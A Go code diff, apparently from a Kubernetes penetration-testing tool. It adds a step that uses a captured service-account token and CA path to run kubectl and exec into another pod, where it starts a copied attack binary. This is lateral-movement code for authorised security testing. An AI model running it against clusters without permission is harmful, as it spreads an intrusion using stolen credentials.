@@ -18,11 +18,12 @@ import (
 	"math/rand"     // Random module for creating random string building
 	"os"            // Environment variables ...
 	"strconv"
+	"syscall"
 
 	// HTTP client/server
 	"net/http" // HTTP requests
 	"net/url"  // URL encoding
-	"os/exec"
+	"os/exec"  // for exec
 	"regexp"
 	"strings"
 	"time" // Time modules
@@ -274,7 +275,20 @@ func injectIntoAPodViaAPIServer(connectionString ServerInfo, pod string) {
 		// println("Option 2 is: ")
 		println("Now, start up a new process, put a copy of kubectl in it, and move into that pod by running the following command:\n\n")
 		println("kubectl --token " + connectionString.Token + " --certificate-authority=" + connectionString.CAPath + " -n " + connectionString.Namespace + " exec -it " + pod + " -- /tmp/peirates\n")
-
+		// CA path
+		ca_path := "--certificate-authority=" + connectionString.CAPath
+		args := []string{"kubectl", "--token", connectionString.Token, ca_path, "-n", connectionString.Namespace, "exec", "-it", pod, "--", "/tmp/peirates"}
+		path := "/tmp/kubectl"
+		env := os.Environ()
+		execErr := syscall.Exec(path, args, env)
+		if execErr != nil {
+			panic(execErr)
+		}
+		// TODO: replace the above one line with:
+		// binary, lookErr := exec.LookPath("ls")
+		// if lookErr != nil {
+		//	panic(lookErr)
+		//}
 	}
 }
 
